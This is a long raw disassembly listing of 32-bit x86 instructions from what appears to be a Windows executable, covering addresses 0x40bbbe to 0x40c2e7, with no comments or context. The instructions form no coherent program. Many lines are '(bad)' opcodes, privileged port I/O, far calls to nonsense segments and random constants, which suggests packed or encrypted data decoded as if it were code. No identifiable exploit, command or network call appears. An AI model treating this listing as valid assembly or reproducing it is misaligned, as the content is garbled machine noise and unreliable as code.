  40bbbe:	push   eax
  40bbbf:	adc    al,bh
  40bbc1:	scas   eax,DWORD PTR es:[edi]
  40bbc2:	push   ebp
  40bbc3:	cmp    esp,edx
  40bbc5:	inc    esi
  40bbc6:	mov    cl,0xa3
  40bbc8:	into   
  40bbc9:	jb     0x40bba0
  40bbcb:	setbe  BYTE PTR [edx]
  40bbce:	sub    DWORD PTR [ebx],ebx
  40bbd0:	shl    dh,1
  40bbd2:	daa    
  40bbd3:	or     al,0x9b
  40bbd5:	call   0x6c6d:0xf720a061
  40bbdc:	js     0x40bc27
  40bbde:	mov    al,ds:0x9f5418f8
  40bbe3:	and    BYTE PTR [eax],bh
  40bbe5:	(bad)  
  40bbe6:	out    0xb6,al
  40bbe8:	xchg   edx,eax
  40bbe9:	adc    BYTE PTR [ebx+0x634c35ae],ch
  40bbef:	sub    esp,esi
  40bbf1:	jae    0x40bbab
  40bbf3:	fst    QWORD PTR [edi-0x1d7af596]
  40bbf9:	push   esi
  40bbfa:	idiv   BYTE PTR [ecx+esi*2]
  40bbfd:	das    
  40bbfe:	loop   0x40bbf7
  40bc00:	push   es
  40bc01:	js     0x40bb96
  40bc03:	xchg   esi,eax
  40bc04:	stos   BYTE PTR es:[edi],al
  40bc05:	aaa    
  40bc06:	jnp    0x40bc0e
  40bc08:	fiadd  DWORD PTR [edi]
  40bc0a:	jbe    0x40bbc7
  40bc0c:	fisub  DWORD PTR [ecx-0x45]
  40bc0f:	icebp  
  40bc10:	mov    ds:0xce738dcb,al
  40bc15:	fwait
  40bc16:	dec    edx
  40bc17:	add    BYTE PTR [ecx+eax*8+0x3e978c31],bh
  40bc1e:	into   
  40bc1f:	jns    0x40bc40
  40bc21:	inc    ebx
  40bc22:	fcom   DWORD PTR [ecx-0x65]
  40bc25:	pusha  
  40bc26:	pop    esp
  40bc27:	xlat   BYTE PTR ds:[ebx]
  40bc28:	add    eax,DWORD PTR [ecx*4-0x6115ec76]
  40bc2f:	into   
  40bc30:	dec    ecx
  40bc31:	scas   al,BYTE PTR es:[edi]
  40bc32:	jbe    0x40bbfa
  40bc34:	aaa    
  40bc35:	leave  
  40bc36:	push   edx
  40bc37:	push   0x38
  40bc39:	sub    eax,DWORD PTR [edi-0x1d8b0573]
  40bc3f:	addr16 push ebp
  40bc41:	xchg   DWORD PTR [esi+0x4c17b056],edx
  40bc47:	jl     0x40bbfb
  40bc49:	inc    edx
  40bc4a:	js     0x40bc49
  40bc4c:	adc    ecx,esp
  40bc4e:	lea    esi,[edi]
  40bc50:	jge    0x40bc96
  40bc52:	xor    DWORD PTR [edi+ebx*8-0x7e],esi
  40bc56:	or     DWORD PTR [ebx],0xfffffff5
  40bc59:	les    ebx,FWORD PTR [ebx+0x3ab87c5e]
  40bc5f:	add    ebp,esp
  40bc61:	mov    ds:0xdb89a539,al
  40bc66:	lods   al,BYTE PTR ds:[esi]
  40bc67:	jge    0x40bc0b
  40bc69:	ja     0x40bc5e
  40bc6b:	mov    WORD PTR [ecx],fs
  40bc6d:	mov    edx,0xec30edb7
  40bc72:	or     eax,0xb19c2b89
  40bc77:	inc    ebp
  40bc78:	push   ebp
  40bc79:	(bad)  
  40bc7a:	scas   al,BYTE PTR es:[edi]
  40bc7b:	addr16 inc ebx
  40bc7d:	and    cl,BYTE PTR [ecx-0xa]
  40bc80:	loopne 0x40bc54
  40bc82:	test   eax,0x4e0ea443
  40bc87:	aam    0x36
  40bc89:	(bad)  
  40bc8a:	iret   
  40bc8b:	xor    DWORD PTR [edx+0x5],0xc812f383
  40bc92:	(bad)  
  40bc93:	inc    edx
  40bc94:	leave  
  40bc95:	and    al,0x1
  40bc97:	lahf   
  40bc98:	pop    ss
  40bc99:	rol    DWORD PTR [edx+0x5e],cl
  40bc9c:	or     edx,ebx
  40bc9e:	pop    ss
  40bc9f:	or     DWORD PTR [ebx+0x73617284],ebp
  40bca5:	cmp    dh,bl
  40bca7:	mov    ah,0x59
  40bca9:	cmp    ah,dl
  40bcab:	push   esi
  40bcac:	fistp  DWORD PTR [ecx+0x5f746f8]
  40bcb2:	out    0x68,eax
  40bcb4:	add    ecx,DWORD PTR [ecx+edx*4]
  40bcb7:	lea    ecx,[esi]
  40bcb9:	dec    ebx
  40bcba:	pop    ds
  40bcbb:	or     eax,0xe0137f7a
  40bcc0:	lock daa 
  40bcc2:	sbb    eax,0xba55db70
  40bcc7:	and    BYTE PTR [eax+0x16],cl
  40bcca:	cwde   
  40bccb:	lods   al,BYTE PTR ds:[esi]
  40bccc:	je     0x40bc69
  40bcce:	pop    ds
  40bccf:	leave  
  40bcd0:	repz in eax,dx
  40bcd2:	jo     0x40bd10
  40bcd4:	mov    ebx,0xf6f2323f
  40bcd9:	sub    eax,0x4f722e4
  40bcde:	mov    al,0x15
  40bce0:	ror    DWORD PTR [eax-0x516f88cc],1
  40bce6:	int3   
  40bce7:	jle    0x40bc9b
  40bce9:	ds enter 0xd46e,0xfa
  40bcee:	mov    edx,0xb9c7fcce
  40bcf3:	ins    BYTE PTR es:[edi],dx
  40bcf4:	xor    esp,DWORD PTR [edi+ebp*1-0x59]
  40bcf8:	pop    ebp
  40bcf9:	jbe    0x40bcc7
  40bcfb:	enter  0xf48c,0x47
  40bcff:	jno    0x40bcf0
  40bd01:	dec    ecx
  40bd02:	inc    ebp
  40bd03:	mov    DWORD PTR [esi+0x14],0x6eab1016
  40bd0a:	push   ss
  40bd0b:	dec    eax
  40bd0c:	jecxz  0x40bce3
  40bd0e:	mov    dl,0xca
  40bd10:	xor    al,0x5f
  40bd12:	je     0x40bcab
  40bd14:	mov    ecx,0xd8e53208
  40bd19:	mov    ds:0x1dd8f427,eax
  40bd1e:	xor    eax,0x7f10f894
  40bd23:	mov    al,ds:0xa0c81ca5
  40bd28:	mov    ds:0xc06e2398,al
  40bd2d:	jmp    0xb612:0xa1448885
  40bd34:	ror    ebp,1
  40bd36:	in     eax,dx
  40bd37:	cwde   
  40bd38:	sbb    eax,0xce9e99fa
  40bd3d:	xchg   ecx,eax
  40bd3e:	pusha  
  40bd3f:	mov    ebx,0xe3a49838
  40bd44:	cmp    bl,BYTE PTR [esi+0x2f8aaf4]
  40bd4a:	jb     0x40bceb
  40bd4c:	sub    bh,BYTE PTR [ecx]
  40bd4e:	into   
  40bd4f:	jbe    0x40bd00
  40bd51:	pop    ecx
  40bd52:	xlat   BYTE PTR ds:[ebx]
  40bd53:	pop    esp
  40bd54:	mov    bh,0x7a
  40bd56:	sbb    DWORD PTR cs:[di-0x5a8d],0xfffffff3
  40bd5d:	nop
  40bd5e:	push   edx
  40bd5f:	sub    BYTE PTR [esi+ecx*2-0x449378ea],dh
  40bd66:	popf   
  40bd67:	mov    cl,0xd2
  40bd69:	(bad)  
  40bd6a:	les    ecx,FWORD PTR [eax-0x7c]
  40bd6d:	cmc    
  40bd6e:	xor    ecx,esp
  40bd70:	arpl   WORD PTR ss:[ebx-0x9],si
  40bd74:	je     0x40bdd2
  40bd76:	(bad)  
  40bd77:	int3   
  40bd78:	aaa    
  40bd79:	mov    dl,0xcb
  40bd7b:	(bad)  
  40bd7c:	test   eax,0xf9ececdf
  40bd81:	leave  
  40bd82:	ret    0x2fe7
  40bd85:	fld    TBYTE PTR [eax-0x3e]
  40bd88:	cwde   
  40bd89:	fisttp DWORD PTR [ebp-0x2494805d]
  40bd8f:	push   es
  40bd90:	aaa    
  40bd91:	cmp    DWORD PTR [edx],esp
  40bd93:	xchg   ebp,eax
  40bd94:	adc    edx,0x737a5db5
  40bd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd9b:	jno    0x40bd36
  40bd9d:	mov    ah,0x34
  40bd9f:	adc    BYTE PTR cs:[eax+0x2729914b],ch
  40bda6:	adc    eax,0xdf595417
  40bdab:	adc    BYTE PTR [ecx+0x2068ed88],cl
  40bdb1:	lods   al,BYTE PTR ds:[esi]
  40bdb2:	mov    esi,0x4bfc5cf1
  40bdb7:	mov    ebx,0x55a05d15
  40bdbc:	xor    al,0x51
  40bdbe:	pop    es
  40bdbf:	cdq    
  40bdc0:	jne    0x40bd4e
  40bdc2:	dec    edi
  40bdc3:	nop
  40bdc4:	out    0x8c,al
  40bdc6:	cwde   
  40bdc7:	sar    BYTE PTR [eax-0xe280f6a],0xe5
  40bdce:	jb     0x40bd66
  40bdd0:	adc    BYTE PTR [esi],dl
  40bdd2:	outs   dx,DWORD PTR ds:[esi]
  40bdd3:	jmp    0xd719:0x886d11ab
  40bdda:	add    al,0x1d
  40bddc:	jnp    0x40bdc9
  40bdde:	xchg   DWORD PTR [ecx],eax
  40bde0:	icebp  
  40bde1:	or     edi,edi
  40bde3:	gs inc esp
  40bde5:	inc    esi
  40bde6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bde7:	push   es
  40bde8:	inc    ebx
  40bde9:	retf   0x374b
  40bdec:	ins    BYTE PTR es:[edi],dx
  40bded:	iret   
  40bdee:	sbb    al,0x6b
  40bdf0:	cmp    DWORD PTR [eax-0x7c2d86e3],0xfc176a5a
  40bdfa:	(bad)  
  40bdfb:	mov    bl,0x80
  40bdfd:	outs   dx,DWORD PTR ds:[esi]
  40bdfe:	dec    ebp
  40bdff:	push   eax
  40be00:	mov    ds:0x6d176a7d,eax
  40be05:	fwait
  40be06:	rcl    BYTE PTR [ebp+0x16],0x9b
  40be0a:	inc    esi
  40be0b:	out    dx,al
  40be0c:	and    BYTE PTR [ecx],bl
  40be0e:	push   ebx
  40be0f:	xchg   edx,eax
  40be10:	xchg   edi,eax
  40be11:	pop    es
  40be12:	push   esp
  40be13:	outs   dx,DWORD PTR ds:[esi]
  40be14:	xchg   ebx,eax
  40be15:	sbb    al,0x78
  40be17:	add    DWORD PTR [ecx-0xad6d2e3],edi
  40be1d:	jg     0x40be71
  40be1f:	fnstcw WORD PTR [eax-0x6d]
  40be22:	mov    dl,0x85
  40be24:	pop    ebx
  40be25:	in     eax,0x91
  40be27:	int3   
  40be28:	cmp    al,0x53
  40be2a:	das    
  40be2b:	fidivr WORD PTR [ebx]
  40be2d:	jmp    DWORD PTR ds:0x2067bcd6
  40be33:	mov    al,ds:0xaf8f5fa4
  40be38:	(bad)  
  40be39:	hlt    
  40be3a:	add    eax,0xead31671
  40be3f:	sbb    ecx,DWORD PTR ds:0xc3d7a58c
  40be45:	(bad)  
  40be46:	out    0x8c,eax
  40be48:	das    
  40be49:	sub    DWORD PTR [ebx-0x1e],0xfbc33fbc
  40be50:	jg     0x40bec2
  40be52:	mov    esi,0x6b868da3
  40be57:	or     cl,BYTE PTR [edi+0x1a]
  40be5a:	out    0xb0,eax
  40be5c:	inc    eax
  40be5d:	pushf  
  40be5e:	in     al,0x9c
  40be60:	sar    DWORD PTR [eax+0x3f70795c],0x94
  40be67:	das    
  40be68:	test   BYTE PTR [edx],0x7c
  40be6b:	inc    eax
  40be6c:	jmp    0x40bdfb
  40be6e:	adc    al,0x61
  40be70:	dec    ebp
  40be71:	pop    eax
  40be72:	inc    ebp
  40be73:	mov    bh,0xff
  40be75:	add    eax,0x7e03a854
  40be7a:	pop    esp
  40be7b:	cmc    
  40be7c:	and    DWORD PTR [esi-0x2277a627],0xffffffd4
  40be83:	sub    al,ch
  40be85:	sub    al,0x26
  40be87:	push   ebp
  40be88:	jne    0x40be74
  40be8a:	adc    eax,0x1e143598
  40be8f:	rcr    BYTE PTR [ebx-0x4b85ed5],1
  40be95:	cmp    BYTE PTR [esi+0x1155ab51],dl
  40be9b:	mov    bh,0x87
  40be9d:	xor    al,0x8c
  40be9f:	push   0xc0816c57
  40bea4:	pop    ebp
  40bea5:	ins    BYTE PTR es:[edi],dx
  40bea6:	inc    ecx
  40bea7:	jecxz  0x40bf21
  40bea9:	jae    0x40bf27
  40beab:	xchg   esp,eax
  40beac:	in     eax,dx
  40bead:	push   es
  40beae:	sbb    DWORD PTR [ebp+0x6e],edx
  40beb1:	out    0x5a,eax
  40beb3:	aam    0xcc
  40beb5:	inc    esi
  40beb6:	lods   al,BYTE PTR ds:[esi]
  40beb7:	sub    dh,dh
  40beb9:	lahf   
  40beba:	and    edi,esp
  40bebc:	ss jnp 0x40bebf
  40bebf:	lock sub DWORD PTR [esi+0x7c],ecx
  40bec3:	add    DWORD PTR [edx],ecx
  40bec5:	sub    bl,BYTE PTR [ecx-0x2d]
  40bec8:	xchg   ebp,eax
  40bec9:	(bad)  
  40beca:	pop    ds
  40becb:	xor    edi,DWORD PTR [ebp+0x3c]
  40bece:	push   edx
  40becf:	mov    dl,0xdf
  40bed1:	pop    ebp
  40bed2:	jbe    0x40bf2c
  40bed4:	mov    ch,0x9b
  40bed6:	or     BYTE PTR [esi+0x51e8b2e3],dh
  40bedc:	pop    esi
  40bedd:	xor    ebx,DWORD PTR [esi+0x40307c3c]
  40bee3:	mov    ds:0x9c493a1,eax
  40bee8:	ss call 0xde550cc5
  40beee:	sbb    al,0x7b
  40bef0:	adc    DWORD PTR [esi-0x5],esi
  40bef3:	mov    eax,ds:0x2ae9be7
  40bef8:	imul   esi,esp,0xffffffbb
  40befb:	fldcw  WORD PTR [ecx-0x6a]
  40befe:	push   esp
  40beff:	outs   dx,BYTE PTR ds:[esi]
  40bf00:	mov    ecx,0xd927f232
  40bf05:	jmp    0x40bf1b
  40bf07:	add    eax,DWORD PTR [edi+0x3317c28b]
  40bf0d:	push   edi
  40bf0e:	pushf  
  40bf0f:	lea    esi,[ebx]
  40bf11:	(bad)  
  40bf12:	les    ebp,FWORD PTR [ebx]
  40bf14:	lock mov ah,0x1
  40bf17:	cdq    
  40bf18:	jecxz  0x40bf89
  40bf1a:	ss stos DWORD PTR es:[edi],eax
  40bf1c:	loope  0x40beba
  40bf1e:	fmul   DWORD PTR [eax+0x4c]
  40bf21:	mov    dl,0xca
  40bf23:	jmp    0xf0656f70
  40bf28:	leave  
  40bf29:	std    
  40bf2a:	pop    esi
  40bf2b:	xchg   ecx,eax
  40bf2c:	in     al,0x70
  40bf2e:	js     0x40bee0
  40bf30:	push   es
  40bf31:	lock neg DWORD PTR [esi]
  40bf34:	dec    esi
  40bf35:	xlat   BYTE PTR ds:[ebx]
  40bf36:	mov    ah,0xa0
  40bf38:	sub    ah,0x83
  40bf3b:	xchg   esi,eax
  40bf3c:	add    BYTE PTR [ebx+eax*1+0x53],cl
  40bf40:	mov    ds:0xe2d43aff,eax
  40bf45:	dec    edi
  40bf46:	ds sub al,0xde
  40bf49:	push   ebp
  40bf4a:	inc    ebx
  40bf4b:	test   eax,0x1a86fb34
  40bf50:	xor    cl,cl
  40bf52:	or     al,0xf5
  40bf54:	add    edx,DWORD PTR [eax+eiz*4-0x35]
  40bf58:	and    DWORD PTR [esi+0x16],ecx
  40bf5b:	icebp  
  40bf5c:	cmp    BYTE PTR [ebx],al
  40bf5e:	mov    ds:0xa5b644ef,eax
  40bf63:	out    0xf9,al
  40bf65:	jmp    0x40bf63
  40bf67:	xor    eax,0xd2406a65
  40bf6c:	int3   
  40bf6d:	pop    es
  40bf6e:	sub    ebx,DWORD PTR [edi-0x56]
  40bf71:	or     ah,0xb2
  40bf74:	mov    ecx,0x19a8f6c5
  40bf79:	popa   
  40bf7a:	loopne 0x40bf7d
  40bf7c:	into   
  40bf7d:	mov    cl,BYTE PTR [edi]
  40bf7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf80:	mov    edi,0xb4f77bb1
  40bf85:	cdq    
  40bf86:	mov    ds,WORD PTR [ebx]
  40bf88:	jo     0x40bf42
  40bf8a:	(bad)  
  40bf8b:	cmp    eax,0x33203506
  40bf90:	mov    esi,0x56a9238c
  40bf95:	lock xchg esi,eax
  40bf97:	or     DWORD PTR [edi],edx
  40bf99:	in     al,0x3d
  40bf9b:	pop    esp
  40bf9c:	into   
  40bf9d:	jg     0x40bf83
  40bf9f:	fwait
  40bfa0:	mov    bl,0xd
  40bfa2:	sub    DWORD PTR [edx],0x66
  40bfa5:	mov    bh,0xb6
  40bfa7:	cmp    ebp,DWORD PTR [ecx-0x66]
  40bfaa:	data16 in al,0xcd
  40bfad:	test   BYTE PTR [eax-0x10d3f5e2],ah
  40bfb3:	int    0x79
  40bfb5:	xchg   ebx,eax
  40bfb6:	add    al,0x78
  40bfb8:	add    ebx,DWORD PTR [ecx+0xb]
  40bfbb:	fcmovnb st,st(1)
  40bfbd:	sub    al,bl
  40bfbf:	adc    BYTE PTR [esi-0x1b90e5cd],cl
  40bfc5:	mov    es,WORD PTR [ebx]
  40bfc7:	mov    edx,0xb0f6ff59
  40bfcc:	mov    ebp,0x9f8ee723
  40bfd1:	xchg   ebp,eax
  40bfd2:	or     al,0x5f
  40bfd4:	dec    edx
  40bfd5:	jno    0x40bf76
  40bfd7:	jl     0x40bfce
  40bfd9:	pop    ebp
  40bfda:	test   eax,0xa83c3d6b
  40bfdf:	xor    DWORD PTR [ecx+0x5],edx
  40bfe2:	cmp    BYTE PTR [edi],cl
  40bfe4:	xchg   ecx,eax
  40bfe5:	push   ecx
  40bfe6:	xchg   ecx,eax
  40bfe7:	std    
  40bfe8:	xchg   esi,eax
  40bfe9:	adc    al,0xfe
  40bfeb:	xchg   ebx,eax
  40bfec:	popa   
  40bfed:	fld    TBYTE PTR [esi]
  40bfef:	add    al,0x8
  40bff1:	xor    eax,0xf550db3c
  40bff6:	nop
  40bff7:	aam    0x3f
  40bff9:	add    edi,ebp
  40bffb:	(bad)  
  40bffc:	aad    0xb7
  40bffe:	jae    0x40c00d
  40c000:	ja     0x40bfba
  40c002:	mov    dh,0xae
  40c004:	jno    0x40c012
  40c006:	lock inc eax
  40c008:	sar    DWORD PTR [edi-0x5befa0fb],cl
  40c00e:	loop   0x40bf9f
  40c010:	mov    bl,0xf8
  40c012:	addr16 or eax,esp
  40c015:	repnz push es
  40c017:	xchg   esp,eax
  40c018:	mov    ebp,0x1a32ee26
  40c01e:	in     al,dx
  40c01f:	gs test esi,esp
  40c022:	jo     0x40c036
  40c024:	cdq    
  40c025:	sbb    dh,BYTE PTR [ebx+0x1a]
  40c028:	lock mov ebx,0x3b6c7fe
  40c02e:	push   esp
  40c02f:	aam    0x34
  40c031:	jecxz  0x40c09c
  40c033:	cwde   
  40c034:	mov    bh,0xb3
  40c036:	inc    eax
  40c037:	cmp    DWORD PTR [eax+0x4e],eax
  40c03a:	dec    esp
  40c03b:	pop    ss
  40c03c:	mov    ds,WORD PTR [ecx+edx*4+0x51]
  40c040:	ret    0x2dca
  40c043:	stc    
  40c044:	(bad)  
  40c045:	mov    eax,ds:0x1908139
  40c04a:	adc    edi,DWORD PTR [edi]
  40c04c:	call   0xabad:0xded58f37
  40c053:	sbb    BYTE PTR ds:0xc93ba017,ch
  40c059:	loopne 0x40c093
  40c05b:	out    0x5,eax
  40c05d:	pop    ebp
  40c05e:	retf   0xba1c
  40c061:	cmp    al,0xad
  40c063:	je     0x40c0cb
  40c065:	xchg   DWORD PTR [ebx-0x46],edx
  40c068:	push   esi
  40c069:	sbb    al,0x14
  40c06b:	(bad)  
  40c06c:	adc    cl,al
  40c06e:	jmp    0xb7f3506c
  40c073:	add    DWORD PTR [edx],esi
  40c075:	retf   
  40c076:	dec    esi
  40c077:	dec    edi
  40c078:	fstp   QWORD PTR [edi-0x2e]
  40c07b:	jge    0x40c052
  40c07d:	push   edx
  40c07e:	in     eax,dx
  40c07f:	inc    ebx
  40c080:	fidivr DWORD PTR [ebx+0x59]
  40c083:	fwait
  40c084:	(bad)  
  40c085:	clc    
  40c086:	in     al,0x12
  40c088:	pop    ds
  40c089:	call   0x649808d8
  40c08e:	iret   
  40c08f:	push   eax
  40c090:	mov    al,0x4b
  40c092:	or     al,0x60
  40c094:	icebp  
  40c095:	jae    0x40c0c0
  40c097:	rcl    BYTE PTR [ebx+0x49],0xc9
  40c09b:	jb     0x40c0d5
  40c09d:	jg     0x40c02b
  40c09f:	mov    esi,0x9672b4e2
  40c0a4:	sbb    al,0xb5
  40c0a6:	std    
  40c0a7:	inc    esi
  40c0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a9:	lea    edi,[esi+0x39219be2]
  40c0af:	stos   BYTE PTR es:[edi],al
  40c0b0:	add    al,0x9b
  40c0b2:	std    
  40c0b3:	and    eax,0x40e8a0d5
  40c0b8:	push   edx
  40c0b9:	lock scas al,BYTE PTR es:[edi]
  40c0bb:	lds    esi,FWORD PTR [ebp+0x6d]
  40c0be:	mov    es,WORD PTR [eax-0x4f]
  40c0c1:	sub    DWORD PTR [ecx],eax
  40c0c3:	iret   
  40c0c4:	scas   eax,DWORD PTR es:[edi]
  40c0c5:	sbb    DWORD PTR [esi-0x73],ebx
  40c0c8:	pop    esp
  40c0c9:	sbb    eax,DWORD PTR [eax]
  40c0cb:	jecxz  0x40c10b
  40c0cd:	jns    0x40c11f
  40c0cf:	push   ecx
  40c0d0:	sub    cl,BYTE PTR [ebp-0x15]
  40c0d3:	inc    esi
  40c0d4:	add    DWORD PTR [edi+0x30],ebx
  40c0d7:	xchg   ebp,eax
  40c0d8:	mov    ds:0x92509634,al
  40c0dd:	rol    BYTE PTR [edi],1
  40c0df:	inc    eax
  40c0e0:	sbb    BYTE PTR ds:[ecx],bh
  40c0e3:	rol    ah,1
  40c0e5:	test   cl,ah
  40c0e7:	and    bl,BYTE PTR es:[esi]
  40c0ea:	imul   esp
  40c0ec:	push   0xffffffd1
  40c0ee:	lods   al,BYTE PTR ds:[esi]
  40c0ef:	jmp    0x40c12c
  40c0f1:	int    0xf4
  40c0f3:	jge    0x40c0d7
  40c0f5:	jmp    0x40c08c
  40c0f7:	and    DWORD PTR [edx],eax
  40c0f9:	test   esi,edx
  40c0fb:	cwde   
  40c0fc:	js     0x40c0e4
  40c0fe:	test   DWORD PTR ds:0x2ffff8da,esp
  40c104:	add    al,0x7f
  40c106:	jb     0x40c149
  40c108:	(bad)  
  40c109:	xchg   edx,eax
  40c10a:	sbb    BYTE PTR [eax],dh
  40c10c:	or     bl,ch
  40c10e:	not    DWORD PTR [ebp-0x3d]
  40c111:	push   ebp
  40c112:	fist   DWORD PTR [ebx]
  40c114:	dec    esi
  40c115:	dec    eax
  40c116:	sub    eax,0xb16d3671
  40c11b:	pop    ds
  40c11c:	dec    esp
  40c11d:	sub    BYTE PTR [eax+ebx*4-0x7d01b152],dh
  40c124:	inc    esi
  40c125:	jne    0x40c15a
  40c127:	sbb    DWORD PTR [ebx],esi
  40c129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c12a:	xchg   ebx,eax
  40c12b:	shr    BYTE PTR [ebx+0x79e2b63a],cl
  40c131:	mov    ebp,0xee37415b
  40c136:	fwait
  40c137:	aad    0x5f
  40c139:	ret    
  40c13a:	loope  0x40c1a9
  40c13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c13d:	mov    edi,0x501f733e
  40c142:	mov    ?,ebp
  40c144:	imul   edi,edx,0x3e22901c
  40c14a:	xor    edi,DWORD PTR [ebx+0x60]
  40c14d:	call   0xccd76f6d
  40c152:	loop   0x40c18b
  40c154:	out    0xf7,eax
  40c156:	mov    eax,ds:0x1eab45c9
  40c15b:	mov    bh,0x5d
  40c15d:	leave  
  40c15e:	dec    ecx
  40c15f:	inc    esp
  40c160:	jecxz  0x40c11d
  40c162:	xlat   BYTE PTR ds:[ebx]
  40c163:	ret    0x861
  40c166:	fcompp 
  40c168:	out    dx,al
  40c169:	sbb    DWORD PTR [esp+eax*1],edx
  40c16c:	loope  0x40c198
  40c16e:	or     edi,DWORD PTR [ecx-0x2]
  40c171:	cs push ebp
  40c173:	not    BYTE PTR [esi]
  40c175:	aas    
  40c176:	xor    eax,0x292f9932
  40c17b:	pushf  
  40c17c:	xchg   ecx,eax
  40c17d:	out    dx,al
  40c17e:	mov    bl,0x17
  40c180:	xchg   edx,eax
  40c181:	sar    BYTE PTR [eax+0xadfe3aa],cl
  40c187:	(bad)  
  40c188:	fild   DWORD PTR [ebx-0x7e]
  40c18b:	jae    0x40c167
  40c18d:	push   esi
  40c18e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c18f:	in     al,0x49
  40c191:	push   edx
  40c192:	shl    BYTE PTR [ecx+ecx*4+0x13],1
  40c196:	jmp    0x5463:0x397c5f23
  40c19d:	add    esi,DWORD PTR [esi]
  40c19f:	in     al,0xe0
  40c1a1:	inc    eax
  40c1a2:	hlt    
  40c1a3:	add    DWORD PTR [edx],esp
  40c1a5:	add    edi,eax
  40c1a7:	mov    ds:0x7299e56b,eax
  40c1ac:	or     eax,0x1ee4def4
  40c1b1:	aad    0x30
  40c1b3:	jno    0x40c15f
  40c1b5:	pop    ss
  40c1b6:	xor    BYTE PTR [edx+0x33a55af8],bh
  40c1bc:	and    bl,dh
  40c1be:	pop    es
  40c1bf:	ds in  al,dx
  40c1c1:	les    esp,FWORD PTR [eax]
  40c1c3:	and    DWORD PTR [eax+0x10],ecx
  40c1c6:	inc    ebx
  40c1c7:	sbb    BYTE PTR [eax],ah
  40c1c9:	sub    DWORD PTR [esi+0x163ec6ff],edi
  40c1cf:	pop    ebx
  40c1d0:	in     al,0xd0
  40c1d2:	sbb    edx,DWORD PTR [edi]
  40c1d4:	jl     0x40c23d
  40c1d6:	vxorps ymm6,ymm7,YMMWORD PTR ds:0xc29b8613
  40c1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1df:	sbb    al,0xa1
  40c1e1:	push   es
  40c1e2:	xchg   DWORD PTR [ebx+0x57],eax
  40c1e5:	imul   edi,ebp,0x1724dcbd
  40c1eb:	pop    edi
  40c1ec:	push   ebx
  40c1ed:	pop    ecx
  40c1ee:	jae    0x40c1d8
  40c1f0:	outs   dx,DWORD PTR ds:[esi]
  40c1f1:	je     0x40c1e8
  40c1f3:	or     al,0xfe
  40c1f5:	adc    DWORD PTR [esi+0x3a2910f7],eax
  40c1fb:	mov    edi,0xca01fc3
  40c200:	xchg   esi,eax
  40c201:	ficomp WORD PTR [eax-0x72]
  40c204:	(bad)  
  40c205:	lods   eax,DWORD PTR ds:[esi]
  40c206:	in     eax,dx
  40c207:	push   esi
  40c208:	xchg   ebp,eax
  40c209:	scas   al,BYTE PTR es:[edi]
  40c20a:	pop    ds
  40c20b:	mov    esp,gs
  40c20d:	push   ds
  40c20e:	gs add bl,ch
  40c211:	cmp    ch,BYTE PTR [eax-0x7b910327]
  40c217:	adc    edi,DWORD PTR [edx+0x52]
  40c21a:	sti    
  40c21b:	or     BYTE PTR [edx-0x4429506b],ch
  40c221:	ret    0xa613
  40c224:	es push eax
  40c226:	cmp    eax,0xdb0fe4c8
  40c22b:	(bad)  
  40c22c:	mov    bl,0x40
  40c22e:	push   ebp
  40c22f:	mov    esi,0x5955a185
  40c234:	xor    DWORD PTR [edi+ebp*1+0x58],edi
  40c238:	mov    ecx,0xbd362f21
  40c23d:	dec    esp
  40c23e:	js     0x40c202
  40c240:	mov    ah,ah
  40c242:	mov    edx,0xbd51b3c9
  40c247:	scas   al,BYTE PTR es:[edi]
  40c248:	imul   esi,ecx,0x7250fcbb
  40c24e:	sub    al,0x63
  40c250:	mov    eax,0x4bacf8ce
  40c255:	mov    ebx,0xb57c5f6f
  40c25a:	and    DWORD PTR [esi],eax
  40c25c:	xor    BYTE PTR [ebx-0x65],ah
  40c25f:	xor    ecx,DWORD PTR [ebx+0x1c62c06d]
  40c265:	ret    
  40c266:	pop    edx
  40c267:	and    ebx,DWORD PTR [ebx+0x381b4409]
  40c26d:	ins    BYTE PTR es:[edi],dx
  40c26e:	dec    ebp
  40c26f:	pop    eax
  40c270:	xlat   BYTE PTR ds:[ebx]
  40c271:	sbb    eax,edi
  40c273:	addr16 mov cl,0x4a
  40c276:	inc    esi
  40c277:	retf   0xae74
  40c27a:	ja     0x40c20a
  40c27c:	mov    dh,0x68
  40c27e:	mov    al,0x8b
  40c280:	cmp    ch,BYTE PTR ds:0x7849b1fa
  40c286:	add    DWORD PTR [esi],esp
  40c288:	xchg   edi,eax
  40c289:	push   ebx
  40c28a:	cmc    
  40c28b:	out    dx,al
  40c28c:	(bad)
  40c28f:	das    
  40c290:	inc    ebp
  40c291:	add    ebx,edi
  40c293:	stc    
  40c294:	int    0x68
  40c296:	in     al,dx
  40c297:	out    0xc3,al
  40c299:	aas    
  40c29a:	jno    0x40c313
  40c29c:	mov    ecx,0xb1f66379
  40c2a1:	cmp    BYTE PTR [eax],bl
  40c2a3:	leave  
  40c2a4:	jp     0x40c22e
  40c2a6:	dec    edi
  40c2a7:	mov    eax,0xf80a4931
  40c2ac:	pop    ecx
  40c2ad:	dec    esp
  40c2ae:	enter  0x58ae,0x1
  40c2b2:	fs inc edi
  40c2b4:	stc    
  40c2b5:	adc    DWORD PTR [ecx+0x64],edi
  40c2b8:	xchg   ebx,eax
  40c2b9:	aam    0xb8
  40c2bb:	sub    BYTE PTR [edi],cl
  40c2bd:	mov    eax,0xabaf6049
  40c2c2:	adc    DWORD PTR [ecx-0x55],eax
  40c2c5:	arpl   WORD PTR [ebx],bx
  40c2c7:	aas    
  40c2c8:	cmp    BYTE PTR [eax-0x26],cl
  40c2cb:	and    al,0xd8
  40c2cd:	xchg   BYTE PTR [edi],al
  40c2cf:	xchg   esp,eax
  40c2d0:	jmp    0xbf45af97
  40c2d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d6:	jge    0x40c2ed
  40c2d8:	out    dx,eax
  40c2d9:	(bad)  
  40c2da:	out    dx,al
  40c2db:	or     cl,bh
  40c2dd:	outs   dx,DWORD PTR ds:[esi]
  40c2de:	add    cl,BYTE PTR [ebx+ebx*1]
  40c2e1:	cwde   
  40c2e2:	mov    ds:0x54e2cd86,eax
  40c2e7:	or     al,0x24
